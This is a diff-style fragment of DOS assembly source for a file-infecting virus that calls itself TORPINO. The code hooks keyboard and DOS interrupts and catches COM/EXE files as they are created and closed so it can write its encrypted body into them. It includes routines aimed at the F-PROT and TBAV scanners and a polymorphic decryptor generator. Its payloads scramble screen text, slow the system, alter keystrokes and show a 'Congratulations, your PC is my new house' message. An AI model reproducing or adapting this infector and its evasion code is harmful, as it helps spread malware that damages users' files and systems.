+mixdel: in al,dx
+        loop mixdel
+        pop cx
+        loop resmix
+nomix:  ret
+wnome:  call audio
+        cmp cs:unos,1
+        je inno
+        mov cs:waix,0
+        mov cs:colore,01001110b
+        mov cs:primo,0
+        call sfondo
+        mov cs:unos,1
+        ret
+inno:   cmp cs:swrig,1
+        je chsfo
+        call congra
+        ret
+chsfo:  cmp cs:dues,1
+        je aspe
+        mov cs:colore,11001110b
+        mov cs:primo,1
+        call sfondo
+        mov cs:dues,1
+        ret
+aspe:   dec cs:calma
+        jz inin
+        ret
+
+
+inin:   mov cs:dues,0
+        mov cs:nomc,0
+        mov cs:unos,0
+        mov cs:swrig,0
+        mov cs:swrig,0
+        mov cs:primo,0
+        mov cs:calma,500
+        mov cs:nota,offset music
+        mov cs:onpl,0
+        mov cs:pausm,0
+        mov cs:durat,0
+        ret
+
+
+congra: call setes
+        push cs
+        pop ds
+        mov di,cs:videop
+        mov si,cs:frase
+        movsb
+        inc cs:frase
+        add cs:videop,2
+        dec cs:letn
+        jz incf
+        ret
+incf:   add cs:videop,160-64
+        mov cs:letn,32
+        dec cs:righe
+        jz endr
+        ret
+endr:   mov cs:swrig,1
+        ret
+l1      db 'C O N G R A T U L A T I O N S  !'
+l2      db '         Your PC is my          '
+l3      db '          new house !           '
+l4      db '      I''m not a destroyer...    '
+l5      db '   I''m the incredible Virus... '
+l6      db '    --> T O R P I N O (c) <--    '
+l7      db 'Turn on Sound Blaster Speakers ! '
+        mixer dw 224h,0,225h,0,224h,22h,225h,200,224h,26h,225h,200
+
+
+setes:  mov ax,0b800h
+        mov es,ax
+        mov di,160*9+(160-68)/2
+        ret
+sfondo: call setes
+        mov cs:videop,di
+        add cs:videop,2
+        mov cs:frase,offset l1
+        mov cs:letn,32
+        mov cs:righe,7
+        mov cs:dues,0
+        mov cs:voltx,3
+        mov cx,7
+ver:    push cx
+        mov cx,34
+filx:   cmp cs:primo,0
+        jne seco
+        mov al,20h
+        stosb
+        jmp scol
+seco:   inc di
+scol:   mov al,cs:colore
+        stosb
+        loop filx
+        add di,160-68
+        pop cx
+        loop ver
+        ret
+;-----------------------Noisex: Rallentamento del sistema--------------------
+        uff dw 30 dup(0)
+Noise_lento: ;----------------NOISE LENTO------------------------------------
+        mov cx,3  
+per4:   push cx   
+        mov si,offset uff
+        push cs
+        pop ds
+        push cs
+        pop es
+        push si
+        mov cx,30
+tot:    push cx
+        lodsw
+        mov cx,ax
+        inc cx
+cic:    db 6 dup(90h)
+        loop cic
+        pop cx
+        loop tot
+        mov cx,30
+        pop si
+insu:   lodsw
+        cmp ax,-1
+        je succ
+        inc ax
+        mov di,si
+        sub di,2
+        stosw
+        pop cx
+        loop per4
+        ret
+succ:   loop insu
+me:     jmp me
+
+
+;-----------------------Noisex: Cambio delle vocali--------------------------
+        cont_voc dw 0
+Noise_vocali: ;-----------------------NOISE VOCALI---------------------------
+        call mvideo
+        jz stvoc
+        mov cs:kamtas,1
+        call rantas
+        ret
+stvoc:  mov cs:numtas,0
+        cmp cs:cont_voc,1092
+        je apost
+        inc cs:cont_voc
+        ret
+apost:  mov ax,0b800h
+        mov ds,ax
+        mov cx,2000
+        xor si,si
+voc:    cmp byte ptr ds:[si],'a'
+        je  chvoc 
+        cmp byte ptr ds:[si],'e'
+        je  chvoc 
+        cmp byte ptr ds:[si],'i'
+        je  chvoc 
+        cmp byte ptr ds:[si],'o'
+        je  chvoc 
+        cmp byte ptr ds:[si],'u'
+        je  chvoc
+        cmp byte ptr ds:[si],'A'
+        je  chvocm 
+        cmp byte ptr ds:[si],'E'
+        je  chvocm 
+        cmp byte ptr ds:[si],'I'
+        je  chvocm 
+        cmp byte ptr ds:[si],'O'
+        je  chvocm 
+        cmp byte ptr ds:[si],'U'
+        je  chvocm 
+invoc:  add si,2
+        loop voc
+        mov cs:cont_voc,0
+        ret
+chvoc:  call random
+        xor dx,dx
+        mov bx,5
+        div bx
+        mov di,offset vocali
+        add di,dx
+        mov al,cs:[di]
+        mov ds:[si],al
+        jmp invoc 
+        vocali  db 'aeiou'
+chvocm: call random
+        xor dx,dx
+        mov bx,5
+        div bx
+        mov di,offset vocalim
+        add di,dx
+        mov al,cs:[di]
+        mov ds:[si],al
+        jmp invoc 
+        vocalim  db 'AEIOU'
+;-----------------------Noise0: Vermi----------------------------------------
+dire:   call random
+        mov bx,8
+        xor dx,dx
+        div bx
+        ret
+verme:
+        p1      dw      (4000-2-162) 
+        p2      dw      (4000-2) 
+        p3      dw      (4000-2) 
+        p4      dw      (4000-2) 
+        p5      dw      (4000-2) 
+        p6      dw      (4000-2) 
+        p7      dw      (4000-2) 
+        p8      dw      (4000-2) 
+        p9      dw      (4000-2)
+        coda    dw 0
+        nuovo   dw 0
+        ciclo   db 0
+        spig    db 0
+        bord    db 0
+        senso   db 7
+        vecchio dw 0
+end_verme:
+        vita    db bufverme*22 dup(2)
+vitae:
+        id      dw 0
+        idc     dw 0
+        resu    dw 0
+genera: mov cs:suon,0
+        cmp cs:id,-1
+        jne anvivo
+        cmp cs:resu,1092
+        jne noresu
+        mov cs:resu,0
+        mov cs:id,0
+        ret
+noresu: inc cs:resu
+        ret
+anvivo: push cs
+        pop ds
+        push cs
+        pop es
+        mov cx,cs:id
+        inc cx
+dit:    push cx
+        mov si,offset vita
+        dec cx
+        mov ax,20
+        sub ax,cx
+        xor dx,dx
+        mov bx,bufverme
+        mul bx
+        add si,ax
+        push si
+        mov di,offset verme
+        mov cx,bufverme
+        rep movsb
+        call capo
+        pop di
+        mov si,offset verme
+        mov cx,bufverme
+        rep movsb
+        pop cx
+        loop dit
+        cmp cs:id,20
+        jne new
+        ret
+new:    cmp cs:idc,45 
+        ja incv
+        ret
+incv:   inc cs:id
+        mov cs:idc,0
+        ret
+        ulv     dw 0
+;----------------------------------------------------------------------------
+capo:   cmp cs:vecchio,1092
+        jne vivo
+        call pulisci
+        mov cx,cs:id
+        mov si,offset vitae
+        sub si,bufverme
+        mov di,offset vita
+        mov ax,20
+        sub ax,cx
+        xor dx,dx
+        mov bx,bufverme
+        mul bx
+        add di,ax
+        mov cx,bufverme
+        rep movsb
+        dec cs:id
+        mov cs:vecchio,0
+        ret
+vivo:   inc cs:vecchio
+        push ds es
+        mov ax,0b800h
+        push cs
+        pop ds
+        push ax
+        pop es
+        call stampa
+        call spigoli
+        call bordi
+        call dir
+        call muovi
+        call aggiorna
+        pop es ds
+        ret
+        onv     dw 0
+Noise_vermi:  ;--------------------NOISE_VERMI-------------------------------
+        call mvideo
+        jz stver
+        mov cs:kamtas,1
+        call rantas
+        ret
+stver:  mov cs:numtas,0
+        cmp cs:onv,10
+        je exi
+        inc cs:onv
+        jmp exvermi
+exi:    call genera
+exvermi: ret                         
+;----------------------------------------------------------------------------
+aggiorna:
+        push cs:p9
+        pop cs:coda
+        push cs:p8
+        pop cs:p9
+        push cs:p7
+        pop cs:p8  
+        push cs:p6
+        pop cs:p7
+        push cs:p5
+        pop cs:p6
+        push cs:p4
+        pop cs:p5
+        push cs:p3
+        pop cs:p4
+        push cs:p2
+        pop cs:p3
+        push cs:p1
+        pop cs:p2
+        push cs:nuovo
+        pop cs:p1
+        ret
+;----------------------------------------------------------------------------
+muovi:  cmp cs:senso,0
+        jne m1
+        mov ax,cs:p1
+        sub ax,160
+        mov cs:nuovo,ax
+        ret
+m1:     cmp cs:senso,1
+        jne m2
+        mov ax,cs:p1
+        sub ax,158
+        mov cs:nuovo,ax
+        ret
+m2:     cmp cs:senso,2
+        jne m3
+        mov ax,cs:p1
+        add ax,2
+        mov cs:nuovo,ax
+        ret
+m3:     cmp cs:senso,3
+        jne m4
+        mov ax,cs:p1
+        add ax,162
+        mov cs:nuovo,ax
+        ret
+m4:     cmp cs:senso,4
+        jne m5
+        mov ax,cs:p1
+        add ax,160
+        mov cs:nuovo,ax
+        ret
+m5:     cmp cs:senso,5
+        jne m6
+        mov ax,cs:p1
+        add ax,158
+        mov cs:nuovo,ax
+        ret
+m6:     cmp cs:senso,6
+        jne m7
+        mov ax,cs:p1
+        sub ax,2
+        mov cs:nuovo,ax
+        ret
+m7:     mov ax,cs:p1
+        sub ax,162
+        mov cs:nuovo,ax
+        ret
+;----------------------------------------------------------------------------
+        suon db 0
+stampa: push cs
+        pop ds
+        mov si,offset verme
+        mov cx,9
+video:  lodsw
+        mov di,ax
+        cmp byte ptr es:[di],20h
+        jne ncidc
+        jmp nodc
+ncidc:  cmp byte ptr es:[di],2
+        jne incidc
+        jmp nodc
+incidc: inc cs:idc
+nodc:   mov byte ptr es:[di],2
+        loop video
+        mov di,cs:coda
+        mov byte ptr es:[di],20h
+        ret
+;----------------------------------------------------------------------------
+spigoli:
+        cmp cs:p1,0
+        jne v0
+        mov cs:spig,1
+        ret
+v0:     cmp cs:p1,158
+        jne v1
+        mov cs:spig,2
+        ret
+v1:     cmp cs:p1,3840
+        jne v2
+        mov cs:spig,3
+        ret
+v2:     cmp cs:p1,3998
+        jne v3
+        mov cs:spig,4
+        ret
+v3:     mov cs:spig,0
+        ret
+;----------------------------------------------------------------------------
+bordi:  cmp cs:p1,160
+        jnb s0
+        mov cs:bord,1
+        ret
+s0:     mov ax,cs:p1
+        xor dx,dx
+        mov bx,160
+        div bx
+        cmp dx,158  
+        jne s1
+        mov cs:bord,2
+        ret
+s1:     mov ax,cs:p1
+        xor dx,dx
+        mov bx,160
+        div bx
+        cmp dx,0
+        jne sx
+        mov cs:bord,3
+        ret
+sx:     cmp cs:p1,3838
+        jna s2
+        mov cs:bord,4
+        ret
+s2:     mov cs:bord,0
+        ret
+;----------------------------------------------------------------------------
+dir:    cmp cs:spig,0
+        jne randa
+        cmp cs:bord,0
+        jne randb
+        cmp cs:ciclo,15
+        je chg
+        inc cs:ciclo
+        ret
+chg:    mov cs:ciclo,0
+        call dire
+        mov cs:senso,dl
+        ret
+randa:  cmp cs:spig,1
+        jne h1
+        mov cs:senso,3
+        ret
+h1:     cmp cs:spig,2
+        jne h2
+        mov cs:senso,5
+        ret
+h2:     cmp cs:spig,3
+        jne h4
+        mov cs:senso,1
+        ret
+h4:     mov cs:senso,7
+        ret
+randb:  cmp cs:bord,1
+        jne g1
+        mov cs:senso,4
+        ret
+g1:     cmp cs:bord,2
+        jne g2
+        mov cs:senso,6
+        ret
+g2:     cmp cs:bord,3
+        jne g4
+        mov cs:senso,2
+        ret
+g4:     mov cs:senso,0
+        ret
+;----------------------------------------------------------------------------
+pulisci:
+        push es di   
+        mov ax,0b800h
+        mov es,ax
+        mov si,offset vita
+        mov ax,20
+        sub ax,cs:id
+        mov bx,bufverme
+        xor dx,dx
+        mul bx
+        add si,ax
+        mov cx,10
+videx:  lodsw
+        mov di,ax
+        mov byte ptr es:[di],20h
+        loop videx
+        mov di,cs:coda
+        mov byte ptr es:[di],20h
+        pop di es
+        ret
+        ulb     dw 0
+;-----------------------Noise1: cambio numeri--------------------------------
+        cont_110 dw 0
+Noise_numeri: ;-------------------NOISE NUMERI-------------------------------
+        call mvideo
+        jz stnum
+        mov cs:kamtas,1
+        call rantas
+        ret
+stnum:  mov cs:numtas,0
+        cmp cs:cont_110,1092
+        je aposto
+        inc cs:cont_110
+        ret
+aposto: mov ax,0b800h
+        mov ds,ax
+        mov cx,2000
+        xor si,si
+num:    cmp byte ptr ds:[si],2fh
+        ja  ceck_2
+scan_n: add si,2
+        loop num
+        mov cs:cont_110,0
+        ret
+ceck_2: cmp byte ptr ds:[si],3ah
+        jb cambia
+        jmp scan_n
+cambia: call random
+        xor dx,dx
+        mov bx,10
+        div bx
+        add dx,30h
+        mov byte ptr ds:[si],dl
+        jmp scan_n
+;-----------------------Noise3: caduta delle lettere-------------------------
+        alt dw +2
+        vel dw 1
+        basta db 0
+        posiz   dw 0
+        riga    dw 0
+Noise_casca: ;----------------NOISE CASCA------------------------------------
+        call mvideo
+        jz stcas
+        mov cs:kamtas,1
+        call rantas
+        ret
+stcas:  mov cs:numtas,0
+        mov cs:riga,0
+        mov cs:alt,+2
+        cmp cs:basta,0
+        je cerca
+        mov si,cs:posiz
+        inc cs:vel
+sgiu:   mov cx,cs:vel
+        shr cx,1
+        shr cx,1
+        shr cx,1
+        inc cx
+velx:   call giu
+        loop velx
+        ret
+cerca:  mov ax,0b800h
+        mov ds,ax
+scax:   mov si,4000-160-160
+        mov cx,80
+        cmp cs:alt,2
+        je norm
+        add si,158
+norm:   sub si,cs:riga
+scan:   cmp byte ptr ds:[si],20h
+        jne trov
+risc:   add si,cs:alt
+        loop scan
+        cmp cs:riga,23*160
+        jne decri
+        mov cs:riga,0
+        ret
+decri:  add cs:riga,160
+        cmp cs:alt,2
+        je nno
+        mov cs:alt,+2
+        jmp scax
+nno:    mov cs:alt,-2
+        jmp scax
+trov:   cmp byte ptr ds:[si+160],20h
+        jne risc
+        mov cs:basta,1
+        jmp sgiu
+giu:    mov ax,0b800h
+        mov ds,ax
+        cmp byte ptr ds:[si+160],20h
+        je okgiu
+dsu:    mov cs:vel,1
+        mov cs:basta,0
+        ret
+okgiu:  cmp si,4000-160
+        ja dsu
+        mov al,ds:[si]
+        add si,160
+        mov ds:[si],al
+        mov byte ptr ds:[si-160],20h
+        mov cs:posiz,si
+        ret
+;-----------------------Questa Š la nostra Tastiera--------------------------
+password:
+        mov ax,40h
+        mov ds,ax
+        mov bx,ds:[1ah]
+        cmp bx,ds:[1ch]
+        je sitasto
+        mov ax,ds:[bx]
+        call controllo
+sitasto: ret
+torpino:
+        db 'TORPINO'
+        esatti dw 0
+        prox   db 0 
+controllo:
+        cmp cs:prox,1
+        je prox_is
+        and al,11011111b
+conf_tast:
+        mov bx,offset torpino
+        add bx,cs:esatti
+        cmp al,cs:[bx]
+        jne tasto_no
+        inc cs:esatti
+        cmp cs:esatti,7
+        jne no_disattiva
+        mov cs:prox,1
+        mov cs:esatti,0
+no_disattiva:
+        ret
+tasto_no:
+        mov cs:esatti,0
+        ret
+prox_is:
+        mov cs:prox,0
+        mov cs:on_off,0
+        mov ax,0e07h
+        int 10h
+        ret
+;----------------------------------------------------------------------------
+nulltas:
+        pushf
+        call cs:old_tas
+        call password
+        ret
+rantas: cmp cs:kamtas,0
+        je nortas
+        cmp cs:numtas,0
+        jne nortas
+        call random
+        xor dx,dx
+        mov bx,tasnoise
+        div bx
+        inc dx
+        mov cs:numtas,dx
+        mov cs:kamtas,0
+nortas: ret
+;---------------------Interrupt di tastiera ver. 2.0-------------------------
+        kamtas  db 0
+        numtas  dw 0
+mytas:  pushf
+        cmp cs:on_off,1
+        je tason
+        popf
+        jmp cs:old_tas
+tason:  call pushreg
+        cmp cs:numtas,0
+        jne tt1
+        call nulltas
+        jmp potas
+tt1:    cmp cs:numtas,1
+        jne tt2
+        call noise_tre
+        jmp potas
+tt2:    cmp cs:numtas,2
+        jne tt3
+        call noise_due
+        jmp potas
+tt3:    cmp cs:numtas,3
+        jne tt4
+        call noise_beep
+        jmp potas
+tt4:    cmp cs:numtas,4
+        jne tt5
+        call noise_sbplay
+        jmp potas
+tt5:
+potas:  call popreg
+        popf
+        iret
+;-----------------------NoiseINPIU: Tasti premuti in piu'--------------------
+        delay_piu dw 0
+noise_inpiu:
+        cmp cs:delay_piu,100
+        ja inscar
+        inc cs:delay_piu
+        ret
+inscar: mov cs:delay_piu,0
+non_car:
+        mov si,cs:dove
+        push cs
+        pop ds
+        lodsb
+        cmp al,0
+        jne congod
+        mov cs:dove,offset god
+        jmp nocon
+congod: mov cs:dove,si
+nocon:  mov cl,al
+        xor ch,ch
+        mov ah,5
+        int 16h
+        ret
+dove    dw offset god
+god     db 'You are a Torpiner ',0
+;-----------------------NoiseTAS: SBplay ad ogni tasto-----------------------
+sbscrivi:
+        push ax
+        mov dx,388h
+        mov al,bl
+        out dx,al
+        call delay6
+        pop ax
+        mov dx,389h
+        out dx,al
+        call delay3
+        ret
+delay6: push ax cx dx
+        mov cx,10
+        mov dx,388h
+d12:    in al,dx
+        loop d12
+        pop dx cx ax
+        ret
+delay3: push ax cx dx
+        mov cx,50
+        mov dx,389h
+d90:    in al,dx
+        loop d90
+        pop dx cx ax
+        ret
+;----------------------------------------------------------------------------
+reset:  mov cx,0f4h
+res:    mov bx,cx
+        inc bx
+        xor ax,ax
+        call sbscrivi
+        loop res
+        ret
+;----------------------------------------------------------------------------
+datis   db 20h,01h,40h,10h,60h,0f0h,80h,77h,0a0h
+        lsb     db 98h
+        db 23h,01h,43h,00h,63h,0f0h,83h,77h,0b0h
+        msb     db 31h
+iniz:   push cs
+        pop ds
+        push si
+        mov si,offset datis
+        mov cx,20
+ini:    lodsb
+        mov bl,al
+        lodsb
+        call sbscrivi
+        loop ini
+        pop si
+        ret
+;----------------------------------------------------------------------------
+        ottava db 5
+play:   and ax,0000001111111111b
+        mov cs:lsb,al
+        or ax,0010000000000000b
+        mov bl,cs:ottava
+        shl bl,1
+        shl bl,1
+        or ah,bl
+        mov cs:msb,ah
+        call iniz
+        ret
+play2:  and ax,0000001111111111b
+        mov bl,0a0h
+        push ax
+        call sbscrivi
+        pop ax
+        or ax,0010000000000000b
+        mov bl,cs:ottava
+        shl bl,1
+        shl bl,1
+        or ah,bl
+        mov al,ah
+        mov bl,0b0h
+        call sbscrivi
+        ret
+
+
+
+
+;----------------------------------------------------------------------------
+        sbg db 0
+Noise_sbplay: ;-----------------NOISE SBPLAY---------------------------------
+        call nulltas
+        cmp cs:sbg,0
+        je vaisb
+        ret
+vaisb:  call reset
+        lodsw              
+        call play
+        mov cs:sbg,5
+        ret
+;-----------------------NoiseTAS: Beep ad ogni tasto-------------------------
+        giab db 0
+Noise_beep: ;-------------------NOISE BEEP-----------------------------------
+        call nulltas
+        cmp cs:giab,0
+        je sibeep
+        mov cs:giab,0
+        ret
+sibeep: mov ax,0e07h
+        int 10h
+        mov cs:giab,1
+        ret
+;-----------------------NoiseTAS: Niente doppie------------------------------
+        prex     dw 0
+
+
+Noise_due: ;-----------------------NOISE DUE---------------------------------
+        call nulltas
+        mov ax,40h
+        mov ds,ax
+        mov bx,ds:[1ah]
+        cmp bx,ds:[1ch]
+        jne sitax
+        ret
+sitax:  mov ax,ds:[bx]
+        cmp ax,cs:prex
+        je nosalt
+        mov cs:prex,ax
+        ret
+nosalt: mov bx,ds:[1ah]
+        mov ds:[1ch],bx
+        ret
+;-----------------------NoiseTas: Tre caratteri uguali-----------------------
+        prem     dw 0
+Noise_tre: ;--------------------NOISE TRE------------------------------------
+        call nulltas
+        mov ax,40h
+        mov ds,ax
+        mov bx,ds:[1ah]
+        cmp bx,ds:[1ch]
+        jne sitas
+        ret
+sitas:  mov ax,ds:[bx]
+        cmp ax,cs:prem
+        je nosalto
+        mov cs:prem,ax
+        ret
+nosalto:
+        call nulltas 
+        ret
+;-----------------------Salvataggio del nome del file creato-----------------
+        nomeopen        db 70 dup(0)
+        handopen        dw ?
+        tempopen        dw ?
+        fineopen        dw ?
+        alopen          db 0
+        inopen          db 0
+openfile:
+        cmp cs:alopen,0
+        je saldx
+        mov cs:alflag,0
+        jmp cs:old_dos
+saldx:  mov cs:fineopen,dx
+salsi:  call dos
+        jnc creato
+        jmp iretx
+creato: pushf
+        call pushreg
+        mov cs:tempopen,ax
+        xor ax,ax
+        push ds
+        pop es
+        mov cx,70
+        mov di,cs:fineopen
+        repne scasb
+        sub di,5
+        mov si,di
+        push cs
+        pop es
+        mov cx,4
+        mov di,offset comminus
+        call compara
+        je salvaopen    
+        mov di,offset commaius
+        call compara
+        je salvaopen   
+        mov di,offset exeminus
+        call compara
+        je salvaopen
+        mov di,offset exemaius
+        call compara
+        je salvaopen
+        jmp exitopen
+salvaopen:   
+        mov si,cs:fineopen
+        mov cx,70
+        mov di,offset nomeopen
+        rep movsb
+        mov ax,cs:tempopen
+        mov cs:handopen,ax
+        mov cs:alopen,1
+exitopen:
+        call popreg
+        popf
+        jmp iretx
+;-----------------------Chiusura del file creato-----------------------------
+closefile:
+        cmp cs:alopen,1
+        je filechiuso
+        mov cs:alflag,0
+        jmp cs:old_dos
+filechiuso:
+        cmp cs:no3e,0
+        je yesinf
+        dec cs:no3e
+        mov cs:alopen,0
+        mov cs:alflag,0
+        jmp cs:old_dos
+yesinf: cmp bx,cs:handopen
+        je iclose
+        mov cs:alflag,0
+        jmp cs:old_dos
+iclose: call dos
+        pushf
+        call pushreg
+        mov cs:inopen,1
+        mov dx,offset nomeopen
+        mov cs:offname,dx
+        mov cs:segname,cs
+        mov cs:alopen,0
+        jmp nodsdx
+;-----------------------Controllo delle funzioni interne al DOS--------------
+infdosi:
+        push dx cx
+        and dl,00010000b
+        mov cl,4
+        shr dl,cl
+        cmp dl,1
+        pop cx dx
+        je doscre
+        cmp cs:prot,1
+        je protno
+        jmp infdssi
+protno: mov cs:alflag,0
+        jmp cs:old_dos
+doscre: cmp cs:alopen,0
+        je salsis
+        jmp infdssi
+salsis: mov cs:fineopen,si
+        jmp salsi
+;-----------------------Operazioni particolari per il TLINK------------------
+        tlinkmai        db 'TLINK'
+        tlinkmin        db 'tlink'
+        no3e            db 0
+infdsxx: pushf
+        call pushreg
+        mov di,dx
+        xor ax,ax
+        push ds
+        pop es
+        mov cx,255
+        repne scasb
+        sub di,10
+        mov si,di
+        mov di,offset tlinkmai
+        push cs
+        pop es
+        mov cx,5
+        call compara
+        je sitlink
+        mov di,offset tlinkmin
+        call compara
+        je sitlink
+        inc cx
+        dec si
+        mov di,offset fmai
+        call compara
+        je siprot
+        mov di,offset fmin
+        je siprot
+        jmp notlk
+siprot: mov cs:prot,1
+        jmp notlk
+sitlink: mov cs:no3e,1
+notlk:  call popreg
+        popf
+        jmp infdsdx
+;-----------------------Intercettazione dei file cercati---------------------
+        exe4b db 0
+cerca4: pushf
+        call pushreg
+        mov ah,2fh
+        call dos
+        cmp cs:exe4b,0
+        je popex 
+        cmp cs:prot,1
+        je si4e
+        cmp byte ptr es:[bx],1
+        je popex
+        cmp byte ptr es:[bx],2
+        je popex
+si4e:   mov cs:inopen,0
+        add bx,1eh
+        mov cs:offname,bx
+        mov cs:segname,es
+        jmp nodsdx
+popex:  call popreg
+        popf
+        jmp cs:old_dos
+;-----------------------L' F-PROT Š stato chiuso...--------------------------
+        prot    db 0
+offprot:
+        cmp cs:exe4b,0
+        je nodec
+        dec cs:exe4b
+nodec:  mov cs:prot,0
+        mov cs:alflag,0
+        jmp cs:old_dos
+;----------------------Routine di decry anti TBAV----------------------------
+st_scuro:
+        mov cx,dimscuro
+        db 0beh
+        off_scuro dw ?
+        db 0b0h
+        al_scuro  db ?
+scu:    xor cs:[si],al
+        inc al
+        inc si
+        loop scu
+en_scuro:
+;-----------------------Blocco di infezione da copiare in esterna------------
+sout:   mov si,offset chiaro
+        mov cx,dimvirus-dimdecry
+        mov byte ptr cs:[40h],1
+        push cx ax si
+        mov al,69h
+        mov cx,10
+t_scuro:
+        push cx ax
+        mov si,offset scuro
+        mov cx,dimscuro
+sc1:    xor cs:[si],al
+        inc al
+        inc si
+        loop sc1
+        pop ax cx
+        sub ax,9
+        loop t_scuro
+        pop si ax cx
+        push cx ax si
+cry:    xor cs:[si],al
+        inc al
+        inc si
+        loop cry
+        mov ah,40h
+        mov dx,offset inizio
+        mov cx,dimvirus
+        int 21h
+        pop si
+        pop ax
+        pop cx
+decry:  xor cs:[si],al
+        inc al
+        inc si
+        loop decry
+        mov al,18h
+        mov cx,10
+b_scuro:
+        push ax cx
+        mov cx,dimscuro
+        mov si,offset scuro
+sc2:    xor cs:[si],al
+        inc al
+        inc si
+        loop sc2
+        pop cx ax
+        add ax,9
+        loop b_scuro
+        mov byte ptr cs:[40h],0
+        ret
+endout:
+;======================Push/Pop system di Nik================================
+        offip dw 0
+pushreg:
+        pop cs:offip
+        push ax bx cx dx si di es ds
+        push cs:offip
+        ret
+popreg:
+        pop cs:offip
+        pop ds es di si dx cx bx ax
+        push cs:offip
+        ret
+;============================================================================
+
+
+;-----------------------Parametri che servono alla polimorfica---------------
+        off    dw 1234h       ;offset inizio decry
+        dim    dw dimvirus-dimdecry
+        chiave db 0cch        ;chiave decry
+        xoroff  dw ?
+;-----------------------Generazione della chiave casuale---------------------
+pol:    mov al,0
+        out 43h,al
+        in al,40h
+        mov ah,al
+        in al,40h
+        add al,ah
+        mov cs:chiave,al
+;-----------------------Generazione delle istruzioni casuali-----------------
+        call caso
+        shr dx,1
+        cmp dx,0
+        je dx0
+        cmp dx,1
+        je dx1
+        cmp dx,2
+        je dx2
+        jmp dx3
+dx0:    call polsi0
+        jmp n2
+dx1:    call polsi1
+        jmp n2
+dx2:    call polsi2
+        jmp n2
+dx3:    call polsi3
+        jmp n2
+polsi0: mov si,offset k0
+        mov bl,2
+        call riempi
+        mov byte ptr [si],0b8h
+        mov ax,off
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],0c687h
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polsi1: mov si,offset k0
+        mov byte ptr [si],0b8h
+        mov ax,off
+        inc si
+        sub ax,111h
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],11bbh
+        add si,2
+        mov word ptr [si],0101h
+        add si,2
+        mov word ptr [si],89d8h
+        add si,2
+        mov byte ptr [si],0c6h
+        add si,2
+        ret
+;----------------------------------------------------------------------------
+polsi2: mov si,offset k0
+        mov bl,2
+        call riempi
+        mov byte ptr [si],0beh
+        mov ax,off
+        sub ax,11h
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],83f9h
+        add si,2
+        mov word ptr [si],10d6h
+        add si,2
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polsi3: mov si,offset k0
+        mov byte ptr [si],0bfh
+        mov ax,off
+        add ax,1000h
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],0f787h
+        add si,2
+        mov word ptr [si],0ee81h
+        add si,2
+        mov word ptr [si],1000h 
+        add si,2
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+n2:     call caso
+        shr dx,1
+        cmp dx,0
+        je cx0
+        cmp dx,1
+        je cx1
+        cmp dx,2
+        je cx2
+        jmp cx3
+cx0:    call polcx0
+        jmp n3
+cx1:    call polcx1
+        jmp n3
+cx2:    call polcx2
+        jmp n3
+cx3:    call polcx3
+        jmp n3
+;----------------------------------------------------------------------------
+polcx0: mov si,offset k0+10
+        mov bl,1
+        call riempi
+        mov byte ptr [si],0bah
+        mov ax,dim
+        sub ax,112h
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],012b9h
+        add si,2
+        mov word ptr [si],0101h
+        add si,2
+        mov byte ptr [si],0d1h
+        inc si
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polcx1: mov si,offset k0+10
+        mov byte ptr [si],0b9h
+        mov ax,dim
+        dec ax
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],83f9h
+        add si,2
+        mov word ptr [si],00d1h
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polcx2: mov si,offset k0+10
+        mov bl,2
+        call riempi
+        mov byte ptr [si],0b9h
+        mov ax,dim
+        xchg ah,al
+        inc si
+        mov word ptr [si],ax
+        add si,2
+        mov word ptr [si],0e986h
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polcx3: mov si,offset k0+10
+        mov byte ptr [si],0b6h
+        mov ax,dim
+        inc si
+        mov byte ptr [si],al
+        inc si
+        mov byte ptr [si],0b0h
+        inc si
+        mov byte ptr [si],ah
+        inc si
+        mov word ptr [si],0f186h
+        add si,2
+        mov word ptr [si],0c588h
+        add si,2
+        mov bl,2
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+n3:     call caso
+        shr dx,1
+        cmp dx,0
+        je ax0
+        cmp dx,1
+        je ax1
+        cmp dx,2
+        je ax2
+        jmp ax3
+ax0:    call polax0
+        jmp n4
+ax1:    call polax1
+        jmp n4
+ax2:    call polax2
+        jmp n4
+ax3:    call polax3
+        jmp n4
+;----------------------------------------------------------------------------
+polax0: mov si,offset k0+20
+        mov bl,1
+        call riempi
+        mov word ptr [si],0c031h
+        add si,2  
+        mov al,chiave
+        mov byte ptr [si],0b6h
+        inc si  
+        mov byte ptr [si],al     
+        inc si  
+        mov word ptr [si],0f086h
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polax1: mov si,offset k0+20
+        mov byte ptr [si],0b0h
+        mov al,chiave
+        dec al
+        inc si
+        mov byte ptr [si],al
+        inc si  
+        mov word ptr [si],0ff04h
+        add si,2
+        mov word ptr [si],0114h
+        add si,2
+        mov bl,4
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polax2: mov si,offset k0+20
+        mov bl,2
+        call riempi
+        mov byte ptr [si],0bbh
+        mov al,chiave
+        inc si
+        mov byte ptr [si],al
+        inc si  
+        mov word ptr [si],0100h
+        add si,2
+        mov word ptr [si],93f3h
+        add si,2
+        mov word ptr [si],0f029h
+        add si,2
+        ret
+;----------------------------------------------------------------------------
+polax3: mov si,offset k0+20
+        mov bl,1
+        call riempi
+        mov byte ptr [si],0b0h
+        mov al,chiave
+        add al,3
+        inc si
+        mov byte ptr [si],al
+        inc si
+        mov word ptr [si],0ff2ch
+        add si,2
+        mov word ptr [si],031ch
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+n4:     call caso
+        shr dx,1
+        cmp dx,0
+        je xx0
+        cmp dx,1
+        je xx1
+        cmp dx,2
+        je xx2
+        jmp xx3
+xx0:    call polxx0
+        jmp n5
+xx1:    call polxx1
+        jmp n5
+xx2:    call polxx2
+        jmp n5
